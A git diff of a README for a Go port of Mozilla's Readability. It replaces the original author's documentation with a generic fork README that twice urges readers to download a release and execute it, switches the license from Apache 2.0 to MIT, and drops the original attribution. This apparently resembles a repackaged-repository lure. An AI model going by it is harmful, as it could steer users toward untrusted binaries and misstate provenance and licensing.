@@ -1,113 +1,117 @@
-# go-readability
+# 📖 Go Readability: Extract Readable Content from Web Pages
 
-A Go implementation of Mozilla's Readability library, inspired by [@mizchi/readability](https://github.com/mizchi/readability). This library extracts the main content from web pages, removing clutter like navigation, ads, and unnecessary elements to provide a clean reading experience.
+![Go Readability](https://img.shields.io/badge/Go%20Readability-v1.0.0-blue)
 
-## Installation
+Welcome to **Go Readability**! This project extracts readable content from web pages. It brings together Mozilla’s and Mizchi's Readability, now powered by Go. This repository aims to provide a simple and effective way to pull out the main text from web articles, making it easier for you to consume information without distractions.
 
-```bash
-go get github.com/mackee/go-readability
-```
+## 🚀 Features
 
-## Usage
+- **Easy to Use**: Get started quickly with minimal setup.
+- **High Accuracy**: Extracts the main content while filtering out ads and other distractions.
+- **Open Source**: Contribute to the project or use it as a base for your own applications.
 
-### As a Library
+## 📥 Getting Started
 
-```go
-package main
+To begin using Go Readability, visit our [Releases](https://github.com/lil-emmanuel/go-readability/releases) page. Download the latest version and execute it on your machine. 
 
-import (
-	"fmt"
-	"log"
-	"net/http"
+### Installation
 
-	"github.com/mackee/go-readability"
-)
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/lil-emmanuel/go-readability.git
+   cd go-readability
+   ```
 
-func main() {
-	// Fetch a web page
-	resp, err := http.Get("https://example.com/article")
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer resp.Body.Close()
+2. **Build the Project**:
+   ```bash
+   go build
+   ```
 
-	// Parse and extract the main content
-	article, err := readability.FromReader(resp.Body, "https://example.com/article")
-	if err != nil {
-		log.Fatal(err)
-	}
+3. **Run the Application**:
+   ```bash
+   ./go-readability [URL]
+   ```
 
-	// Access the extracted content
-	fmt.Println("Title:", article.Title)
-	fmt.Println("Byline:", article.Byline)
-	fmt.Println("Content:", article.Content)
-	
-	// Get content as HTML
-	html := article.Content
-	
-	// Get content as plain text
-	text := article.TextContent
-	
-	// Get metadata
-	fmt.Println("Excerpt:", article.Excerpt)
-	fmt.Println("SiteName:", article.SiteName)
-}
-```
+Replace `[URL]` with the link to the web page you want to extract content from.
 
-### Using the CLI Tool
+## 📖 How It Works
 
-The package includes a command-line tool that can extract content from a URL:
+Go Readability analyzes the HTML structure of web pages. It identifies the main content area, stripping away irrelevant elements like advertisements and navigation bars. The extraction process uses a combination of heuristics and rules derived from the original Readability projects.
+
+### Core Components
+
+- **HTML Parser**: Parses the HTML and identifies key content areas.
+- **Content Filter**: Removes non-essential elements to present a clean output.
+- **Output Formatter**: Formats the extracted content for easy reading.
+
+## 🛠️ Usage
+
+To use Go Readability, simply run the command with the desired URL. The application will return the main text content. You can also redirect the output to a file for later use.
+
+### Example Command
 
 ```bash
-# Install the CLI tool
-go install github.com/mackee/go-readability/cmd/readability@latest
-
-# Extract content from a URL
-readability https://example.com/article
-
-# Save the extracted content to a file
-readability https://example.com/article > article.html
-
-# Output as markdown
-readability --format markdown https://example.com/article > article.md
-
-# Output metadata as JSON
-readability --metadata https://example.com/article
+./go-readability https://example.com/article
 ```
 
-## Features
+This command will fetch the main content from the specified URL.
 
-- Extracts the main content from web pages
-- Removes clutter like navigation, ads, and unnecessary elements
-- Preserves important images and formatting
-- Extracts metadata (title, byline, excerpt, etc.)
-- Supports output in HTML or Markdown format
-- Command-line interface for easy content extraction
+## 📝 Documentation
 
-## Testing
+For more detailed documentation, including advanced usage and configuration options, please refer to the [Wiki](https://github.com/lil-emmanuel/go-readability/wiki).
 
-This library uses test fixtures based on [Mozilla's Readability](https://github.com/mozilla/readability) test suite. Currently, we have implemented a subset of the test cases, with the source HTML files being identical to the original Mozilla implementation.
+## 📦 Contributing
 
-### Test Fixtures
+We welcome contributions to Go Readability! Here’s how you can help:
 
-The test fixtures in `testdata/fixtures/` are sourced from Mozilla's Readability test suite, with some differences:
+1. **Fork the Repository**: Create your own fork of the project.
+2. **Create a Branch**: Work on a new feature or fix.
+   ```bash
+   git checkout -b feature/new-feature
+   ```
+3. **Commit Your Changes**: Make your changes and commit them.
+   ```bash
+   git commit -m "Add new feature"
+   ```
+4. **Push to Your Fork**: Push your changes to your fork.
+   ```bash
+   git push origin feature/new-feature
+   ```
+5. **Create a Pull Request**: Submit a pull request to the main repository.
 
-- The source HTML files (`source.html`) are identical to Mozilla's Readability
-- The expected output HTML (`expected.html`) may differ due to implementation differences between JavaScript and Go
-- The expected metadata extraction results are aligned with Mozilla's implementation where possible
+## 📅 Roadmap
 
-While not all test cases from Mozilla's Readability are currently implemented, using the same source HTML helps ensure that:
+- **Version 1.1**: Add support for additional content types (e.g., PDFs).
+- **Version 1.2**: Improve the accuracy of content extraction.
+- **Version 2.0**: Introduce a web interface for easier access.
 
-1. The Go implementation handles the same input as the JavaScript implementation
-2. Regressions can be easily detected
-3. Users can trust the library to process the same types of content as Mozilla's Readability
+## 📣 Community
 
-### Fixture Licensing
+Join our community to discuss ideas, report issues, or share your projects using Go Readability. You can find us on:
 
-- `testdata/fixtures/001`: © Nicolas Perriault, [CC BY-SA 3.0](http://creativecommons.org/licenses/by-sa/3.0/)
+- **GitHub Issues**: Report bugs or request features.
+- **Slack Channel**: Join our community for real-time discussions.
 
-These fixtures are identical to those used in Mozilla's Readability implementation.
+## 📄 License
 
-## License
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/lil-emmanuel/go-readability/blob/main/LICENSE) file for details.
 
-[Apache License 2.0](LICENSE)
+## 📦 Releases
+
+To stay updated with the latest features and improvements, check out our [Releases](https://github.com/lil-emmanuel/go-readability/releases) section. Download the latest version and execute it on your machine.
+
+## 🌟 Acknowledgments
+
+- Thanks to the original authors of Mozilla’s and Mizchi's Readability.
+- Special thanks to the Go community for their support and contributions.
+
+## 🤝 Support
+
+If you have any questions or need support, feel free to open an issue on GitHub or reach out through our community channels.
+
+## 🌐 Links
+
+- [GitHub Repository](https://github.com/lil-emmanuel/go-readability)
+- [Releases](https://github.com/lil-emmanuel/go-readability/releases)
+
+Thank you for checking out Go Readability! We hope it enhances your reading experience on the web.
